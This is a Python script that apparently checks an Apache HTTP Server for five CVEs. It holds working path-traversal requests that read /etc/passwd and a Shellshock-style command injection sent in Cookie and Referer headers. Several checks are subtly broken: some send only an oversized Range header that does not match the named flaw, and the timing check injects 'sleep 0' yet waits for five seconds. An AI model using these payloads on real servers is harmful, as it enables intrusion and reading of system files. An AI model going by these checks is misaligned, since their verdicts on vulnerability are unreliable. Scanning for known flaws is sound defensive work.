#!/usr/bin/env python

import requests
import re


# CVE-2021-40438
def check_cve_2021_40438(url):
    headers = {
        "Range": "bytes=0-18446744073709551615"
    }

    response = requests.get(url, headers=headers)

    if response.status_code == 206 and 'Content-Range' in response.headers:
        print("[+] Your Apache Http Server is vulnerable to CVE-2021-40438!")
        return True
    else:
        print("[-] Your Apache Http Server is not vulnerable to CVE-2021-40438.")
        return False


# CVE-2021-41773
def check_cve_2021_41773(url):
    test_path = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

    try:
        response = requests.get(url + test_path, timeout=10)
        if "root:x" in response.text and response.status_code != 404:
            print("[+] Your Apache Http Server is vulnerable to CVE-2021-41773!")
            return True
        else:
            print("[-] Your Apache Http Server is not vulnerable to CVE-2021-41773!")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False


# CVE-2021-42013
def check_cve_2021_42013(url):
    test_path = "/cgi-bin/.%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd"

    try:
        response = requests.get(url + test_path, timeout=10)
        if "root:x" in response.text and response.status_code != 404:
            print("[+] Your Apache Http Server is vulnerable to CVE-2021-42013!")
            return True
        else:
            print("[-] Your Apache Http Server is not vulnerable to CVE-2021-42013!")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False


# CVE-2017-9798
def check_cve_2017_9798(url):
    try:
        response = requests.get(url, headers={'Range': 'bytes=0-18446744073709551615'}, timeout=10)
        allow_header = response.headers.get('Allow', '')

        if re.search(r'[\x00-\x08\x0b\x0c\x0e-\x1f]', allow_header):
            print("[+] Your Apache Http Server is vulnerable to CVE-2017-9798!")
            return True
        else:
            print("[-] Your Apache Http Server is not vulnerable to CVE-2017-9798!")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False


# CVE-2016-8743***
def check_cve_2016_8743(url):
    try:
        malicious_request = '() { :; }; /bin/sleep 0'
        response = requests.get(url, headers={'Cookie': malicious_request, 'Referer': malicious_request}, timeout=10)
        response_time = response.elapsed.total_seconds()
        if response_time > 5:
            print("[+] Your Apache Http Server is vulnerable to CVE-2016-8743!")
            return True
        else:
            print("[-] Your Apache Http Server is not vulnerable to CVE-2016-8743!")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False


cve_vulnerabilities = {
    'CVE-2021-40438': check_cve_2021_40438,
    'CVE-2016-8743': check_cve_2016_8743,
    'CVE-2017-9798': check_cve_2017_9798,
    'CVE-2021-42013': check_cve_2021_42013,
    'CVE-2021-41773': check_cve_2021_41773
}
